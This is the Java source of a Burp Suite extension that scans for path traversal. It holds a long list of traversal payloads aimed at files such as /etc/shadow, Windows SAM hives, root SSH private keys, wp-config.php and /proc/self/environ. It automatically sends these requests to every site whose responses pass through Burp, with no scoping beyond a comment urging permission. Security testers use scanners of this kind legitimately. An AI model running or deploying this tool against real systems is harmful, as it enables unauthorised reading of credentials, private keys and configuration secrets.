/**
 * TraversalScanner.java
 *
 * This Burp Suite extension actively scans for file path traversal vulnerabilities.
 * It extracts URLs from HTTP responses, constructs payloads, and sends requests in parallel.
 * Results are reported through Burp Suite's logging and alert systems.
 *
 * Version: 1.0
 *
 * Usage:
 * 1.  Compile this file into a JAR.
 * 2.  Load the JAR as a Burp Suite extension.
 * 3.  The extension will automatically process HTTP responses and send traversal requests.
 *
 * Key Features:
 * -   Extracts URLs from HTML and CSS.
 * -   Parses URL parameters.
 * -   Sends requests in parallel using sendRequests(List<HttpRequest> requests).
 * -   Reports potential vulnerabilities through Burp Suite's logging and alerts.
 * -   URL encodes payloads.
 * -   Handles base url and url with parameters.
 *
 * Dependencies:
 * -   Burp Suite and its Montoya API.
 *
 * Notes:
 * -   This extension is intended for ethical security testing.
 * -   Use responsibly and only on systems you have permission to test.
 * -   Adjust payloads as needed for specific target environments.
 * -   Requires Burp Suite with Montoya API support.
 */

package example.traversalscanner;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.handler.HttpHandler;
import burp.api.montoya.http.handler.HttpRequestToBeSent;
import burp.api.montoya.http.handler.HttpResponseReceived;
import burp.api.montoya.logging.Logging;
import burp.api.montoya.http.handler.*;

import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static burp.api.montoya.http.handler.RequestToBeSentAction.continueWith;
import static burp.api.montoya.http.handler.ResponseReceivedAction.continueWith;

public class TraversalScanner implements BurpExtension, HttpHandler {

    private Logging logging;
    private MontoyaApi api;
    private final String[] payloads = {
        "../../../../win.ini",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "..\\..\\..\\..\\win.ini",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252fetc/passwd",
        "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwin.ini",
        "/etc/passwd",
        "C:\\\\windows\\win.ini",
        "../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "../../../../etc/shadow",
        "../../../../etc/group",
        "../../../../etc/hosts",
        "../../../../etc/issue",
        "../../../../boot.ini",
        "../../../../windows/system.ini",
        "../../../../windows/system32/drivers/etc/hosts",
        "../../../../windows/system32/config/sam",
        "../../../../windows/repair/sam",
        "../../../../windows/repair/system",
        "../../../../windows/system32/config/regback/system",
        "../../../../windows/system32/config/regback/sam",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%255c..%255c..%255c..%255cwindows%255cwin.ini",
        "....//....//....//....//etc/passwd",
        "....\\....\\....\\....\\windows\\win.ini",
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "\\..\\..\\..\\..\\..\\windows\\win.ini",
        "/etc/passwd%00",
        "C:\\boot.ini",
        "C:\\windows\\win.ini",
        "C:\\windows\\system32\\config\\sam",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\Program Files\\Application\\config.json",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/var/log/auth.log",
        "/var/log/syslog",
        "../../../../../../../var/www/html/index.php",
        "../../../../../../../../../usr/local/apache/logs/access.log",
        "../../../../../../../../../usr/local/apache/logs/error.log",
        "../../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../../etc/shadow",
        "../../../../../../../../../../../../../etc/group",
        "../../../../../../../../../../../../../etc/hosts",
        "../../../../../../../../../../../../../etc/issue",
        "../../../../../../../../../../../../../var/www/html/config.php",
        "../../../../../../../../../../../../../var/www/html/.htaccess",
        "../../../../../../../../../../../../../var/www/html/wp-config.php",
        "../../../../../../../../../../../../../home/user/.bashrc",
        "../../../../../../../../../../../../../home/user/.bash_profile",
        "../../../../../../../../../../../../../home/user/.ssh/id_rsa",
        "../../../../../../../../../../../../../root/.ssh/id_rsa"
    };

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.logging = api.logging();
        api.http().registerHttpHandler(this);
        api.extension().setName("Traversal Scanner");
        logging.logToOutput("Traversal Scanner extension loaded");
    }

    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent httpRequestToBeSent) {
        return continueWith(httpRequestToBeSent);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived httpResponseReceived) {
        String responseBody = httpResponseReceived.bodyToString();
        String requestUrl = httpResponseReceived.initiatingRequest().url();
        List<String> urls = extractUrls(responseBody, requestUrl);

        Map<String, Map<String, List<String>>> baseUrlsWithParams = new HashMap<>();

        for (String url : urls) {
            String baseUrl = getBaseUrl(url);
            Map<String, List<String>> params = parseParams(url);
            baseUrlsWithParams.put(baseUrl, params);
        }

        List<HttpRequest> requests = new ArrayList<>();

        for (Map.Entry<String, Map<String, List<String>>> entry : baseUrlsWithParams.entrySet()) {
            String baseUrl = entry.getKey();
            Map<String, List<String>> params = entry.getValue();
            requests.addAll(createTraversalRequests(baseUrl, params, httpResponseReceived.initiatingRequest().httpService()));
        }

        if (!requests.isEmpty()) {
            api.http().sendRequests(requests).forEach(response -> {
                if (response != null && response.response() != null) {
                    String body = response.response().bodyToString().toLowerCase();
                    if (body.contains("root:") || body.contains("etc/passwd") || body.contains("win.ini")) {
                        logging.raiseCriticalEvent("[!] Potential Traversal: " + response.request().url());
                    }
                }
            });
        }
        return continueWith(httpResponseReceived);
    }

    private List<HttpRequest> createTraversalRequests(String baseUrl, Map<String, List<String>> params, HttpService service) {
        List<HttpRequest> requests = new ArrayList<>();

        for (String payload : payloads) {
            try {
                String encodedPayload = URLEncoder.encode(payload, StandardCharsets.UTF_8);
                URL testUrlBase = new URL(new URL(baseUrl), encodedPayload);
                requests.add(HttpRequest.httpRequest(service, testUrlBase.toString()));

                Map<String, List<String>> modifiedParams = new HashMap<>(params);
                modifiedParams.put("traversal", List.of(encodedPayload));
                URL testUrlParams = constructUrlWithParams(baseUrl, modifiedParams);
                requests.add(HttpRequest.httpRequest(service, testUrlParams.toString()));

            } catch (Exception e) {
                logging.logToError("Error creating traversal requests: " + e.getMessage());
            }
        }
        return requests;
    }

    private List<String> extractUrls(String html, String baseUrl) {
        List<String> urls = new ArrayList<>();
        Pattern tagPattern = Pattern.compile("<(a|img|video|source)\\s[^>]*?(href|src)=\"([^\"]+)\"[^>]*?>", Pattern.CASE_INSENSITIVE);
        Matcher tagMatcher = tagPattern.matcher(html);
        while (tagMatcher.find()) {
            String url = tagMatcher.group(3);
            try {
                urls.add(new URL(new URL(baseUrl), url).toString());
            } catch (MalformedURLException e) {
                logging.logToError("Malformed URL: " + url + " in " + baseUrl);
            }
        }
        Pattern cssUrlPattern = Pattern.compile("url\\s*\\(\\s*['\"]?([^'\")]*)['\"]?\\s*\\)", Pattern.CASE_INSENSITIVE);
        Matcher cssUrlMatcher = cssUrlPattern.matcher(html);
        while (cssUrlMatcher.find()) {
            String url = cssUrlMatcher.group(1);
            try {
                urls.add(new URL(new URL(baseUrl), url).toString());
            } catch (MalformedURLException e) {
                logging.logToError("Malformed CSS URL: " + url + " in " + baseUrl);
            }
        }
        return urls;
    }

    private String getBaseUrl(String url) {
        try {
            URL parsedUrl = new URL(url);
            return new URL(parsedUrl.getProtocol(), parsedUrl.getHost(), parsedUrl.getPort(), parsedUrl.getPath()).toString();
        } catch (MalformedURLException e) {
            logging.logToError("Malformed URL: " + url);
            return url;
        }
    }

    private Map<String, List<String>> parseParams(String url) {
        Map<String, List<String>> params = new HashMap<>();
        try {
            URL parsedUrl = new URL(url);
            String query = parsedUrl.getQuery();
            if (query != null) {
                String[] pairs = query.split("&");
                for (String pair : pairs) {
                    String[] keyValue = pair.split("=");
                    if (keyValue.length == 2) {
                        String key = keyValue[0];
                        String value = keyValue[1];
                        params.computeIfAbsent(key, k -> new ArrayList<>()).add(value);
                    }
                }
            }
        } catch (MalformedURLException e) {
            logging.logToError("Malformed URL: " + url);
        }
        return params;
    }

    private URL constructUrlWithParams(String baseUrl, Map<String, List<String>> params) throws MalformedURLException {
        StringBuilder urlBuilder = new StringBuilder(baseUrl);
        if (!params.isEmpty()) {
            urlBuilder.append("?");
            boolean first = true;
            for (Map.Entry<String, List<String>> entry : params.entrySet()) {
                for (String value : entry.getValue()) {
                    if (!first) {
                        urlBuilder.append("&");
                    }
                    first = false;
                    urlBuilder.append(URLEncoder.encode(entry.getKey(), StandardCharsets.UTF_8)).append("=").append(URLEncoder.encode(value, StandardCharsets.UTF_8));
                }
            }
        }
        return new URL(urlBuilder.toString());
    }
}